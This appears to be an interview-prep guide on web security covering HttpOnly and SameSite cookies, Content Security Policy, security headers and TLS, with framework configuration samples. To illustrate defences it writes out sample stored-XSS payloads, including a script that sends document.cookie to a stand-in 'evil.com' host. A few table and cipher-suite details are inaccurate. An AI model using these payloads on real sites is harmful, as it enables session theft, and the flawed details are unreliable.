# Web Security Specifics

## Question 1: What is the purpose of HTTP-only cookies and how do they work?

**Answer:**

### What is an HTTP-only Cookie?

An HTTP-only cookie is a cookie with the `HttpOnly` flag set, making it inaccessible to JavaScript's `document.cookie` API. The browser includes it in HTTP requests automatically, but client-side scripts cannot read or modify it.

```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
                │                                  │
           No JS access                     Sent only to origin
       (document.cookie fails)         (prevents CSRF attacks)
```

### How It Works

```http
// Server response sets the cookie with HttpOnly flag
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; HttpOnly; Secure; Path=/; SameSite=Lax

// Browser stores the cookie, marked as HttpOnly

// JavaScript code CANNOT read it:
console.log(document.cookie);  // "" or other non-HttpOnly cookies only

// But browser STILL sends it with every request:
GET /profile HTTP/1.1
Cookie: session_id=abc123   // ← automatically included
```

### Comparison of Cookie Flags

| Flag | Purpose | Without It |
|------|---------|------------|
| `HttpOnly` | Prevents JavaScript access | XSS can steal cookie |
| `Secure` | Cookie only sent over HTTPS | Cookie sent over HTTP (MITM) |
| `SameSite=Strict` | Cookie only sent for same-site requests | CSRF attacks possible |
| `SameSite=Lax` | Cookie sent for top-level GET navigations | Mild CSRF protection |
| `SameSite=None` | Cookie sent cross-site (requires Secure) | Works with third-party |
| `Path=/` | Restricts cookie to path | Cookie sent to all paths |
| `Domain=example.com` | Restricts to domain + subdomains | Only exact domain |

### Attack Scenarios Protected by HttpOnly

```javascript
// Stored XSS on comments page
// Attacker injects:
<script>
    // Without HttpOnly — steal session
    fetch('https://evil.com/steal?cookie=' + document.cookie);

    // With HttpOnly — document.cookie returns empty for HttpOnly cookies
    fetch('https://evil.com/steal?cookie=' + document.cookie);
    // Attacker gets nothing useful
</script>
```

### When HttpOnly Is NOT Enough

```
HttpOnly cookie on its own:
✅ Prevents cookie theft via XSS
❌ Does NOT prevent CSRF (attacker can still trigger requests)
❌ Does NOT prevent session fixation (if attacker sets cookie beforehand)
❌ Does NOT prevent MITM if Secure flag is missing
❌ Does NOT prevent XSS itself (just mitigates cookie theft)
```

### Storage Types: What HttpOnly Protects Against

| Storage | Accessible via XSS | Survives Refresh | Survives Tab Close |
|---------|-------------------|-------------------|--------------------|
| `LocalStorage` | ✅ Yes | ✅ Yes | ✅ Yes |
| `SessionStorage` | ✅ Yes | ❌ No | ❌ No |
| `HttpOnly cookie` | ❌ No | ✅ Yes | ✅ Yes (if no session expiry) |
| JS variable | ❌ No | ❌ No | ❌ No |

### Setting HttpOnly Cookies

```php
<?php
// PHP native
setcookie('session_id', $sessionId, [
    'expires' => time() + 86400,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,       // ← JavaScript cannot access
    'samesite' => 'Lax',      // ← CSRF mitigation
]);

// Laravel
Cookie::queue('session_id', $sessionId, 120, '/', null, true, true);

// Or via response
return response('Hello')
    ->cookie('session_id', $sessionId, 120, '/', null, true, true);
```

```javascript
// Express/Node.js
res.cookie('session_id', sessionId, {
    httpOnly: true,     // ← JavaScript cannot access
    secure: true,       // HTTPS only
    sameSite: 'lax',    // CSRF mitigation
    maxAge: 86400000,   // 24 hours
    path: '/',
});
```

### Configuration by Framework

```ini
; PHP session config (php.ini)
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Lax"
session.use_strict_mode = 1
session.use_only_cookies = 1
```

```php
// config/session.php (Laravel)
'http_only' => true,        // HttpOnly flag
'secure' => env('SESSION_SECURE_COOKIE', true),
'same_site' => 'lax',       // SameSite cookie
```

### Combined Defense Strategy

```
Layer 1: Prevent XSS
  → CSP headers, input sanitization, output escaping

Layer 2: Mitigate XSS impact
  → HttpOnly flag on session cookies
  → CSRF tokens or SameSite cookies for state-changing requests

Layer 3: Limit damage
  → Short session TTL
  → Regenerate session ID after login
  → Monitor for anomalous activity
```

**Follow-up:**
- Can HttpOnly cookies be stolen despite the flag?
- What is the difference between HttpOnly and Secure flags?
- How does SameSite cookie attribute relate to CSRF protection?
- Can you set HttpOnly cookies from JavaScript? (No — only server can)
- What happens to HttpOnly cookies during CORS requests?

**Key Points:**
- HttpOnly prevents JavaScript access to cookies via `document.cookie`
- It mitigates XSS cookie theft but does NOT prevent XSS itself
- Must be combined with Secure, SameSite, and CSRF protection
- Only the server can set HttpOnly cookies (Set-Cookie header)
- Browser still sends HttpOnly cookies automatically with requests
- Essential for session cookies in production applications

---

## Question 2: How does Content Security Policy (CSP) protect against XSS?

**Answer:**

CSP is an HTTP header that restricts which resources the browser can load and execute.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

### CSP Directives

| Directive | Controls |
|-----------|----------|
| `default-src` | Fallback for all resource types |
| `script-src` | Allowed script sources |
| `style-src` | Allowed stylesheet sources |
| `img-src` | Allowed image sources |
| `connect-src` | Allowed fetch/XMLHttpRequest targets |
| `font-src` | Allowed font sources |
| `frame-src` | Allowed iframe sources |
| `object-src` | Allowed plugin sources |
| `base-uri` | Allowed `<base>` tag values |
| `form-action` | Allowed form submission targets |
| `report-uri` | Where to send violation reports |

### CSP Example

```php
// Laravel middleware
class CspMiddleware {
    public function handle($request, Closure $next) {
        $response = $next($request);

        $response->headers->set('Content-Security-Policy',
            "default-src 'self';" .
            "script-src 'self' https://analytics.example.com;" .
            "style-src 'self' 'unsafe-inline';" .
            "img-src 'self' data: https:;" .
            "connect-src 'self' https://api.example.com;" .
            "font-src 'self' https://fonts.googleapis.com;" .
            "frame-src 'none';" .
            "object-src 'none';" .
            "base-uri 'self';" .
            "form-action 'self'"
        );

        return $response;
    }
}
```

### CSP + XSS: How It Stops Attacks

```html
<!-- Injected script — CSP blocks it -->
<script>
    fetch('https://evil.com/steal?c=' + document.cookie);
</script>
<!-- CSP: script-src 'self' → inline scripts blocked -->

<!-- Injected event handler — blocked -->
<img src=x onerror="alert(1)">
<!-- CSP: 'unsafe-inline' not set → inline handlers blocked -->

<!-- eval() blocked -->
<script>
    eval('malicious code');
</script>
<!-- CSP: 'unsafe-eval' not set → eval() blocked -->
```

**Follow-up:**
- What is the difference between CSP blocking and reporting modes?
- How do you implement CSP for third-party scripts?
- What is CSP nonce-based whitelisting?

**Key Points:**
- CSP prevents XSS even if injection occurs
- Use `Content-Security-Policy-Report-Only` for testing
- Combine with nonces or hashes for inline scripts
- Strict CSP (no 'unsafe-inline') provides strongest protection

---

## Question 3: How do cookie attributes work together for comprehensive security?

**Answer:**

### Complete Cookie Configuration

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Domain=example.com; Max-Age=86400
```

### Attribute Interaction Matrix

| Scenario | HttpOnly | Secure | SameSite=Strict | SameSite=Lax | SameSite=None |
|----------|----------|--------|-----------------|--------------|---------------|
| XSS reads cookie | ✅ Blocked | — | — | — | — |
| HTTP page sends cookie | — | ✅ Blocked | — | — | — |
| Cross-site `<form>` POST | — | — | ✅ Blocked | ✅ Blocked | ❌ Sent |
| Cross-site `<img>` GET | — | — | ✅ Blocked | ❌ Sent | ❌ Sent |
| Same-site navigation | — | — | ❌ Sent | ❌ Sent | ❌ Sent |
| CORS with credentials | — | — | ✅ Blocked* | ✅ Blocked* | ❌ Requires Secure |

*\* Cross-site CORS requests don't send cookies unless `Access-Control-Allow-Credentials: true` and origin is explicitly allowed*

### Best Practice by Use Case

```http
// Session cookie (most common)
Set-Cookie: session_id=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400

// Remember-me token
Set-Cookie: remember=xyz; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000

// CSRF token (must be accessible to JS)
Set-Cookie: XSRF-TOKEN=def; Secure; SameSite=Strict; Path=/

// Analytics tracking (third-party)
Set-Cookie: _ga=123; Secure; SameSite=None; Path=/; Max-Age=63072000

// Sensitive app (banking)
Set-Cookie: session_id=abc; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=900
```

### Cookie Security Layers

```
┌─────────────────────────────────────────────────────────────┐
│                  Defense in Depth                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Layer 1: Transport Security                                │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Secure flag + HSTS → cookie never sent over HTTP   │    │
│  │  HTTPS only → no MITM cookie theft                  │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  Layer 2: Client-Side Isolation                             │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  HttpOnly → XSS can't read cookie                   │    │
│  │  CSP → blocks script injection                      │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  Layer 3: CSRF Protection                                   │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  SameSite=Strict/Lax → cross-site requests blocked │    │
│  │  CSRF tokens → double verification                 │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  Layer 4: Session Management                                │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Short TTL (15-60 min)                             │    │
│  │  Regenerate ID on privilege change                 │    │
│  │  Absolute timeout (24h)                            │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Follow-up:**
- When would you use SameSite=None vs SameSite=Lax?
- How does HSTS relate to cookie security?
- What is the difference between session and persistent cookies?

**Key Points:**
- Always use HttpOnly + Secure + SameSite together for session cookies
- SameSite=Strict for high-security apps, SameSite=Lax for general use
- SameSite=None requires Secure flag and is needed for cross-origin auth
- CSP adds defense-in-depth beyond cookie flags
- Short TTL and session rotation limit damage if cookie is compromised

---

## Question 4: What are the most common web security headers and their purposes?

**Answer:**

### Security Headers Overview

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Header Reference

| Header | Purpose | Recommended Value |
|--------|---------|-------------------|
| `Strict-Transport-Security` | Force HTTPS, prevent downgrade attacks | `max-age=31536000; includeSubDomains` |
| `Content-Security-Policy` | Prevent XSS, control resource loading | `default-src 'self'` |
| `X-Content-Type-Options` | Prevent MIME type sniffing | `nosniff` |
| `X-Frame-Options` | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
| `Referrer-Policy` | Control referrer information sent | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Restrict browser API access | Granular per-feature |
| `Cross-Origin-Embedder-Policy` | Require CORP for cross-origin resources | `require-corp` |
| `Cross-Origin-Opener-Policy` | Isolate cross-origin windows | `same-origin` |
| `Cross-Origin-Resource-Policy` | Control cross-origin resource sharing | `same-origin` |

### Implementation

```php
// Laravel middleware
class SecurityHeaders {
    public function handle($request, Closure $next) {
        $response = $next($request);

        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

        return $response;
    }
}
```

```nginx
# nginx configuration
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Content-Type-Options nosniff always;
add_header X-Frame-Options DENY always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
```

**Follow-up:**
- What is HSTS preloading and how does it work?
- How does X-Frame-Options prevent clickjacking?
- What is the difference between CORP and CORS?

**Key Points:**
- HSTS forces HTTPS and prevents SSL stripping attacks
- CSP is the most powerful header but requires careful configuration
- X-Frame-Options=DENY prevents clickjacking
- Permissions-Policy controls browser feature access (camera, location, etc.)
- Headers work together as defense in depth

---

## Question 5: How does TLS/SSL secure HTTP connections?

**Answer:**

### TLS Handshake

```
Client                          Server
  │                                │
  ├──────── ClientHello ──────────►│  (TLS version, cipher suites)
  │◄─────── ServerHello ──────────┤  (chosen cipher, session ID)
  │◄─────── Certificate ──────────┤  (X.509 cert + chain)
  │◄─────── ServerHelloDone ──────┤
  │                                │
  ├──────── ClientKeyExchange ────►│  (pre-master secret, encrypted with server's public key)
  ├──────── ChangeCipherSpec ─────►│
  ├──────── Finished ─────────────►│
  │◄─────── ChangeCipherSpec ─────┤
  │◄─────── Finished ─────────────┤
  │                                │
  ├──────── Encrypted HTTP ───────►│  ← Application data encrypted
  │◄─────── Encrypted HTTP ───────┤
```

### Cipher Suites

```
TLS_AES_256_GCM_SHA384  — Modern, recommended
  │     │       │
  │     │       └── HMAC-SHA384 for message authentication
  │     └────────── AES-256 in GCM mode for encryption
  └──────────────── TLS 1.3 key exchange

TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256  — TLS 1.2
  │     │            │        │
  │     │            │        └── HMAC-SHA256
  │     │            └─────────── AES-128-GCM
  │     └──────────────────────── RSA for authentication
  └────────────────────────────── ECDHE for key exchange
```

### Protocol Versions

| Version | Year | Status | Key Features |
|---------|------|--------|--------------|
| SSL 2.0 | 1995 | ❌ Deprecated | Broken crypto |
| SSL 3.0 | 1996 | ❌ Deprecated | POODLE attack |
| TLS 1.0 | 1999 | ❌ Deprecated | BEAST attack |
| TLS 1.1 | 2006 | ❌ Deprecated | CBC protection |
| TLS 1.2 | 2008 | ✅ Recommended | AEAD ciphers (GCM) |
| TLS 1.3 | 2018 | ✅ Best | 1-RTT, 0-RTT, no RSA key exchange |

**Follow-up:**
- What is the difference between TLS and SSL?
- How does Certificate Authority (CA) validation work?
- What is certificate pinning and should you use it?

**Key Points:**
- TLS encrypts HTTP traffic between client and server
- TLS 1.3 reduces handshake to 1 round trip
- Certificates validate server identity via trusted CAs
- Always use strong cipher suites (no RC4, no 3DES, no RSA key exchange)
- HSTS ensures browsers always connect via HTTPS

---

## Notes

Add more questions covering:
- OAuth2 and OpenID Connect flows
- JWT security considerations (algorithm confusion, key rotation)
- API security (rate limiting, input validation, IDOR prevention)
- WebSocket security (origin validation, WSS)
- Subresource Integrity (SRI) for CDN assets
- Cross-Origin Read Blocking (CORB)
- Server-Side Request Forgery (SSRF) prevention
- Security logging and monitoring
- Web application firewall (WAF) strategies
